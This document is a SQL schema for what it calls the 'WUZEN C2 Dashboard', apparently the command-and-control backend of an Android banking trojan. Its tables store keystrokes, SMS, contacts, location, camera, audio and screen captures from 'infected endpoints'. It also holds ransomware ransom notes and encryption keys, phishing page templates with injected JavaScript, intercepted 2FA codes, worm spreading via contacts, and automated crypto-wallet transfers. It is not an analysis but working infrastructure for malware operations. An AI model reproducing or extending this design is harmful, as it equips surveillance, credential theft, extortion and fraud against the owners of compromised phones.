-- 001_init.sql
-- WUZEN C2 Dashboard Database Schema

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Users / Operators
CREATE TABLE users (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    username VARCHAR(64) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(32) DEFAULT 'operator',
    is_active BOOLEAN DEFAULT true,
    last_login TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Devices (infected endpoints)
CREATE TABLE devices (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id VARCHAR(128) UNIQUE NOT NULL,
    device_name VARCHAR(255),
    model VARCHAR(128),
    manufacturer VARCHAR(128),
    android_version VARCHAR(32),
    sdk_level INTEGER,
    imei VARCHAR(64),
    imsi VARCHAR(64),
    phone_number VARCHAR(32),
    carrier VARCHAR(128),
    mcc_mnc VARCHAR(16),
    country VARCHAR(64),
    ip_address INET,
    mac_address VARCHAR(32),
    battery_level INTEGER,
    is_charging BOOLEAN DEFAULT false,
    screen_locked BOOLEAN DEFAULT false,
    is_rooted BOOLEAN DEFAULT false,
    is_emulator BOOLEAN DEFAULT false,
    admin_enabled BOOLEAN DEFAULT false,
    doze_whitelisted BOOLEAN DEFAULT false,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status VARCHAR(32) DEFAULT 'online',
    latitude DECIMAL(10,8),
    longitude DECIMAL(11,8),
    accuracy DECIMAL(10,2),
    location_updated TIMESTAMP,
    tags TEXT[],
    notes TEXT,
    encryption_key VARCHAR(512),
    c2_config JSONB DEFAULT '{}'
);

-- Device Hardware Details
CREATE TABLE device_hardware (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    cpu_arch VARCHAR(32),
    cpu_cores INTEGER,
    total_ram BIGINT,
    available_ram BIGINT,
    total_storage BIGINT,
    available_storage BIGINT,
    screen_resolution VARCHAR(32),
    screen_density INTEGER,
    sensors JSONB DEFAULT '[]',
    cameras JSONB DEFAULT '[]',
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Commands Queue
CREATE TABLE commands (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    command_type VARCHAR(64) NOT NULL,
    payload JSONB DEFAULT '{}',
    status VARCHAR(32) DEFAULT 'pending',
    result JSONB,
    executed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    priority INTEGER DEFAULT 5,
    retries INTEGER DEFAULT 0
);

-- Keylogs
CREATE TABLE keylogs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    app_package VARCHAR(255),
    app_name VARCHAR(255),
    keystrokes TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    session_id VARCHAR(128)
);

-- SMS Messages
CREATE TABLE sms_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    message_id VARCHAR(128),
    address VARCHAR(64),
    body TEXT,
    type VARCHAR(16),
    read BOOLEAN DEFAULT false,
    date TIMESTAMP,
    thread_id VARCHAR(64),
    contact_name VARCHAR(255)
);

-- Call Logs
CREATE TABLE call_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    number VARCHAR(64),
    name VARCHAR(255),
    type VARCHAR(16),
    duration INTEGER,
    date TIMESTAMP,
    location VARCHAR(255)
);

-- Contacts
CREATE TABLE contacts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_id VARCHAR(128),
    display_name VARCHAR(255),
    phone_numbers JSONB DEFAULT '[]',
    emails JSONB DEFAULT '[]',
    photo_uri TEXT,
    last_updated TIMESTAMP
);

-- Notifications
CREATE TABLE notifications (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    package_name VARCHAR(255),
    app_name VARCHAR(255),
    title TEXT,
    text TEXT,
    ticker TEXT,
    post_time TIMESTAMP,
    actions JSONB DEFAULT '[]',
    category VARCHAR(64),
    priority INTEGER
);

-- Clipboard Data
CREATE TABLE clipboard_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    text TEXT NOT NULL,
    app_source VARCHAR(255),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Location History
CREATE TABLE location_history (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    latitude DECIMAL(10,8) NOT NULL,
    longitude DECIMAL(11,8) NOT NULL,
    altitude DECIMAL(10,2),
    accuracy DECIMAL(10,2),
    speed DECIMAL(8,2),
    bearing DECIMAL(6,2),
    provider VARCHAR(32),
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Camera Snapshots
CREATE TABLE camera_snapshots (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    camera_type VARCHAR(16),
    file_path TEXT,
    minio_key VARCHAR(512),
    file_size BIGINT,
    width INTEGER,
    height INTEGER,
    taken_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Audio Recordings
CREATE TABLE audio_recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    duration INTEGER,
    file_path TEXT,
    minio_key VARCHAR(512),
    file_size BIGINT,
    sample_rate INTEGER,
    channels INTEGER,
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Screen Recordings
CREATE TABLE screen_recordings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    duration INTEGER,
    file_path TEXT,
    minio_key VARCHAR(512),
    file_size BIGINT,
    width INTEGER,
    height INTEGER,
    fps INTEGER,
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- File Manager Entries
CREATE TABLE file_entries (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    path TEXT NOT NULL,
    name VARCHAR(512),
    type VARCHAR(16),
    size BIGINT,
    permissions VARCHAR(16),
    modified_at TIMESTAMP,
    is_directory BOOLEAN DEFAULT false,
    parent_path TEXT,
    scanned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Ransomware Configs
CREATE TABLE ransomware_configs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    title VARCHAR(255),
    body TEXT,
    wallet_address VARCHAR(512),
    amount DECIMAL(18,8),
    currency VARCHAR(16),
    is_active BOOLEAN DEFAULT false,
    encryption_algorithm VARCHAR(32),
    file_extensions TEXT[],
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Encrypted Files (Ransomware)
CREATE TABLE encrypted_files (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    original_path TEXT,
    encrypted_path TEXT,
    file_size BIGINT,
    encryption_key VARCHAR(512),
    encrypted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Service Injection Targets
CREATE TABLE injection_targets (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    app_package VARCHAR(255),
    app_name VARCHAR(255),
    category VARCHAR(32),
    is_injected BOOLEAN DEFAULT false,
    injection_data JSONB DEFAULT '{}',
    injected_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Phishlet Templates
CREATE TABLE phishlets (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    name VARCHAR(128) UNIQUE NOT NULL,
    target_domain VARCHAR(255),
    html_template TEXT,
    css_override TEXT,
    js_inject TEXT,
    capture_fields JSONB DEFAULT '[]',
    redirect_url TEXT,
    is_active BOOLEAN DEFAULT false,
    created_by UUID REFERENCES users(id),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Phishlet Captures
CREATE TABLE phishlet_captures (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    phishlet_id UUID REFERENCES phishlets(id) ON DELETE CASCADE,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    captured_data JSONB DEFAULT '{}',
    ip_address INET,
    user_agent TEXT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 2FA Interception
CREATE TABLE tfa_intercepts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    code VARCHAR(16),
    source_app VARCHAR(255),
    source_number VARCHAR(64),
    message TEXT,
    intercepted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    used BOOLEAN DEFAULT false
);

-- Installed Apps
CREATE TABLE installed_apps (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    package_name VARCHAR(255),
    app_name VARCHAR(255),
    version VARCHAR(64),
    is_system_app BOOLEAN DEFAULT false,
    is_enabled BOOLEAN DEFAULT true,
    first_install TIMESTAMP,
    last_update TIMESTAMP,
    permissions JSONB DEFAULT '[]',
    scanned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Running Processes
CREATE TABLE running_processes (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    pid INTEGER,
    process_name VARCHAR(255),
    package_name VARCHAR(255),
    cpu_usage DECIMAL(5,2),
    memory_usage BIGINT,
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Network Events
CREATE TABLE network_events (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    event_type VARCHAR(64),
    ssid VARCHAR(255),
    bssid VARCHAR(32),
    ip_address INET,
    gateway INET,
    dns_servers INET[],
    is_vpn BOOLEAN DEFAULT false,
    is_proxy BOOLEAN DEFAULT false,
    recorded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Worm Propagation Logs
CREATE TABLE worm_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    target_contact VARCHAR(255),
    message_body TEXT,
    sent_via VARCHAR(32),
    status VARCHAR(32) DEFAULT 'pending',
    sent_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ATS (Automated Transfer System) Logs
CREATE TABLE ats_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    target_app VARCHAR(128),
    amount DECIMAL(18,8),
    currency VARCHAR(16),
    wallet_address VARCHAR(512),
    status VARCHAR(32) DEFAULT 'pending',
    transaction_hash TEXT,
    initiated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    completed_at TIMESTAMP
);

-- Session Tokens
CREATE TABLE sessions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID REFERENCES users(id) ON DELETE CASCADE,
    token VARCHAR(512) UNIQUE NOT NULL,
    expires_at TIMESTAMP NOT NULL,
    ip_address INET,
    user_agent TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Audit Logs
CREATE TABLE audit_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    user_id UUID REFERENCES users(id) ON DELETE SET NULL,
    action VARCHAR(128),
    target_type VARCHAR(64),
    target_id UUID,
    details JSONB DEFAULT '{}',
    ip_address INET,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indexes
CREATE INDEX idx_devices_status ON devices(status);
CREATE INDEX idx_devices_last_seen ON devices(last_seen);
CREATE INDEX idx_commands_device_status ON commands(device_id, status);
CREATE INDEX idx_keylogs_device ON keylogs(device_id);
CREATE INDEX idx_keylogs_timestamp ON keylogs(timestamp);
CREATE INDEX idx_sms_device ON sms_logs(device_id);
CREATE INDEX idx_location_device_time ON location_history(device_id, recorded_at);
CREATE INDEX idx_notifications_device ON notifications(device_id);
CREATE INDEX idx_file_entries_device ON file_entries(device_id);
CREATE INDEX idx_tfa_device ON tfa_intercepts(device_id);
CREATE INDEX idx_ats_device ON ats_logs(device_id);

-- Insert default admin
INSERT INTO users (username, email, password_hash, role)
VALUES ('admin', 'admin@wuzen.local', '$2b$12$WuZenAdminHash2026Secure', 'admin');
